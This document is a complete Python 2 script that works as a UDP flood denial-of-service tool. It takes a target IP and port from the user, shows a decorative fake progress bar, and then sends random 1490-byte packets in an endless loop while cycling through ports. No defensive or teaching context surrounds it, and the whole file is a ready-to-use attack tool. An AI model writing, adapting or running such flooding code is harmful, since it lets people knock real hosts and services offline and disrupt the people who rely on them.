import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos attekre")
print
print "Auto :Pyae Sone Hmoo"
print
ip = raw_input("Target IP : ")
port = input("Port      : ")
os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[0499519858644094180057770      ] 25%"
time.sleep(5)
print "[14817838552994582097409563884596312636236498875031          ] 50%"
time.sleep(5)
print "[952785326767399546877025026218027752923851743641334785694453960353088082836    ] 75%"
time.sleep(5)
print "[8332328334618606143007550951315641907133436978182373529685199528076455790970092081899290058175834635] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
